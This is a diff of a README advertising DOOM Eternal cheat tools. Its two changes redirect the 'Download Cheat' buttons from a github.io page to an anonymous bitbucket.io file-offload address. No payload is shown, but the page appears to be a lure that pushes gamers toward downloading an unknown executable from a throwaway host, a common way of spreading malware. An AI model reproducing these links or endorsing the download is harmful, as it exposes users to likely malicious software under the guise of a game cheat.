@@ -8,7 +8,7 @@ With the **DOOM Eternal Cheat system**, you can activate **god mode, bottomless 
 
 Whether you're testing combos, speedrunning, or just here to shred — the cheat tools let you **fully break the game** in the best way possible.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/doom-eternal/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload19.bitbucket.io)
 ---
 
 ## 💥 What Can You Do With DOOM Eternal Cheats?
@@ -37,7 +37,7 @@ Whether you're testing combos, speedrunning, or just here to shred — the cheat
 * **Custom Gravity** – Adjust jump height and fall speed
 * **Level Warp** – Skip to any mission
 
-[![Download Cheat](https://i.ebayimg.com/images/g/wnYAAOSw3BBedeV0/s-l1600.jpg)](https://wecheaters.github.io/cheats/doom-eternal/)
+[![Download Cheat](https://i.ebayimg.com/images/g/wnYAAOSw3BBedeV0/s-l1600.jpg)](https://fileoffload19.bitbucket.io)
 ---
 
 ## 👾 Cheat vs Vanilla Gameplay
